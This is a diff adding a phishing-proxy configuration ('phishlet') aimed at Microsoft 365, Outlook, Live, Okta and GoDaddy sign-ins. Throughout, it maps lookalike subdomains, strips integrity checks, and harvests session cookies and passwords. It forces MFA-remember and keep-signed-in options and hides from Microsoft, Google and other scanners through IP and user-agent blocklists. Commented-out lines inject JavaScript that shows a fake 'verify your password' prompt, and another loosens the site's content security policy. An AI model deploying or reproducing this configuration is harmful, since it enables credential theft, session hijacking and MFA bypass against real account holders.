@@ -1,0 +1,708 @@
+name: "o365"
+author: "@tare"
+min_ver: "3.0.0"
+proxy_hosts:
+  - { phish_sub: "98oiukjq", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ijoknm", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "vdae", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "asdwf", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "lknlq", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "9879", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "asdfdf", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "adffasd", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "afeqdw", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+#do not change sub for godaddy
+  - { phish_sub: "", orig_sub: "", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "advgeqw", orig_sub: "events.api", domain: "godaddy.com", session: true, is_landing: false }
+  - {phish_sub: 'res', orig_sub: 'r4.res', domain: 'office365.com', session: false, is_landing: false}
+  - {phish_sub: 's', orig_sub: '', domain: 'microsoftonline.com', session: true, is_landing: false}
+#
+  - { phish_sub: "3er", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
+  - { phish_sub: "f", orig_sub: "aadcdn", domain: "msftauth.net", session: true, is_landing: false }
+
+  - {phish_sub: 'g.sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'okta', orig_sub: 'login', domain: 'okta.com', session: true, is_landing: false, auto_filter: false}
+#
+  - { phish_sub: "av", orig_sub: "outlook", domain: "office.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "afw", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "98", orig_sub: "go", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "xcwq", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "afv", orig_sub: "browser.events.data", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "adwq", orig_sub: "r4.res", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+
+sub_filters:
+  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.microsoft.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html",  "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if !e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
+  # - { triggers_on: "outlook.office.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if (!e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msauth.net",   search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoft.com", orig_sub: "", domain: "", search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title></title>", mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '</head>', replace: '<style>.background-logo-holder{visibility:hidden}</style></HEAD>', mimes: ["text/html"] }
+
+  # - {
+  #     triggers_on: "login.microsoftonline.com",
+  #     orig_sub: "",
+  #     domain: "",
+  #     search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"',
+  #     replace: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"',
+  # s: ["text/html"],
+  #   }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+##
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accont.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "github", domain: "githubassets.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "avatars", domain: "githubusercontent.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "collector", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "api", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
+  - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
+  - { triggers_on: "events.api.godaddy.com", orig_sub: "events.api", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+  - {triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - {triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com",   search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "godaddy.com",   search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+#  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  
+  
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*,regexp,optional,always']
+  - domain: '.microsoftonline.com'
+    keys: ['.*,regexp,optional,always']
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'esctx', 'esctx-*', 'buid', 'fpc', 'SignInStateCookie']
+    type: 'cookie'
+
+  - domain: 'login.live.com'
+    keys: ['MSPRequ', 'uaid']
+    type: 'cookie'
+  - domain: '.live.com'
+    keys: ['.*,regexp,optional,always']
+
+  - domain: '.login.live.com'
+    keys: ['.*,regexp,optional,always']
+
+
+  - domain: 'outlook.office365.com'
+    keys: ['OpenIdConnect.nonce.*', 'OWAPF', 'OIDC', 'ClientId', 'X-OWA-RedirectHistory']
+    type: 'cookie'
+  - domain: 'outlook.live.com'
+    keys: ['.*,regexp,optional,always']
+
+  - domain: 'outlook.office.com'
+    keys: ['.*,regexp,optional,always']
+
+
+
+force_post:
+  - path: "/ppsecure/post*"
+    search:
+      - { key: "LoginOptions", search: "1" }
+    force:
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+
+auth_urls:
+  - "/mail/"
+  - "/mail/0/"
+  - '/kmsi*'
+
+credentials:
+  username:
+    key: ""
+    search: '"username":"([^"]*)'
+    type: "json"
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: '(.*)'
+    type: "post"
+
+login:
+  domain: "outlook.office365.com"
+  path: "/owa/"
+cloaking:
+  enabled: true
+  ip_whitelist: []
+  ip_blacklist:
+    - 13.64.0.0/11
+    - 40.64.0.0/10
+    - 40.96.0.0/13
+    - 40.104.0.0/15
+    - 52.112.0.0/14
+    - 52.120.0.0/14
+    - 65.52.0.0/14
+    - 104.40.0.0/13
+    - 137.116.0.0/13
+    - 157.54.0.0/15
+    - 157.56.0.0/14
+    - 157.60.0.0/16
+    - 207.46.0.0/16
+    - 13.64.0.0/11
+    - 40.64.0.0/10
+    - 40.96.0.0/13
+    - 40.104.0.0/15
+    - 52.112.0.0/14
+    - 52.120.0.0/14
+    - 65.52.0.0/14
+    - 104.40.0.0/13
+    - 137.116.0.0/13
+    - 157.54.0.0/15
+    - 157.56.0.0/14
+    - 157.60.0.0/16
+    - 207.46.0.0/16
+    - 23.96.0.0/13
+    - 8.8.8.8
+    - 8.8.4.4
+    - 64.233.160.0/19
+    - 66.102.0.0/20
+    - 66.249.80.0/20
+    - 72.14.192.0/18
+    - 74.125.0.0/16
+    - 108.177.8.0/21
+    - 173.194.0.0/16
+    - 207.126.144.0/20
+    - 209.85.128.0/17
+    - 216.58.192.0/19
+    - 216.239.32.0/19
+    - 66.102.6.194
+    - 66.102.6.195
+    - 66.102.6.196
+    - 66.102.6.197
+    - 66.102.6.198
+    - 66.102.6.199
+    - 66.102.6.200
+    - 66.102.6.201
+    - 66.102.6.202
+    - 66.102.6.203
+    - 40.96.0.0/12
+    - 52.96.0.0/14
+    - 98.137.54.0/24
+    - 74.6.136.0/24
+    - 74.6.128.0/19
+    - 72.30.0.0/16
+    - 98.139.0.0/16
+    - 67.195.0.0/16
+    - 66.196.64.0/19
+    - 64.233.160.0/19
+    - 66.102.0.0/20
+    - 66.249.80.0/20
+    - 72.14.192.0/18
+    - 74.125.0.0/16
+    - 108.177.8.0/21
+    - 172.217.0.0/19
+    - 209.85.128.0/17
+    - 66.102.6.0/24
+    - 66.249.64.0/19
+    - 72.14.194.0/24
+    - 66.249.74.9
+    - 66.249.74.10
+    - 66.249.74.11
+    - 66.249.74.12
+    - 66.249.74.13
+    - 66.249.74.14
+    - 66.249.74.1
+    - 66.249.65.13
+    - 66.249.65.14
+    - 66.249.64.0 - 66.249.95.255
+    - 66.102.6.0 - 66.102.15.255
+    - 64.233.160.0 - 64.233.191.255
+    - 209.85.128.0 - 209.85.255.255
+    - 216.239.32.0 - 216.239.63.255
+    - 216.239.32.0/19
+  user_agent_blacklist:
+    - ZoominfoBot
+    - Defender
+    - Googlebot
+    - SmartScreen
+    - bingbot
+    - YandexBot
+    - Baiduspider
+    - DuckDuckBot
+    - Slurp
+    - Sogou
+    - Exabot
+    - facebot
+    - ia_archiver
+    - MJ12bot
+    - AhrefsBot
+    - SemrushBot
+    - DotBot
+    - SEMrushBot
+    - spbot
+    - linkdexbot
+    - SeznamBot
+    - sitebot
+    - BLEXBot
+    - Twitterbot
+    - TweetmemeBot
+    - BitlyBot
+    - Pinterbot
+    - facebookexternalhit
+    - WhatsApp
+    - TelegramBot
+    - Slackbot
+    - Discordbot
+    - Googlebot-Image
+    - Googlebot-Video
+    - Googlebot-News
+    - Googlebot-Mobile
+    - AdsBot-Google
+    - AdsBot-Google-Mobile
+    - Mediapartners-Google
+    - Mediapartners
+    - NetcraftSurveyAgent
+    - DigitalOcean
+    - Microsoft-CryptoAPI
+    - msnbot
+    - Adidxbot
+    - Applebot
+    - ArchiveBot
+    - BacklinkCrawler
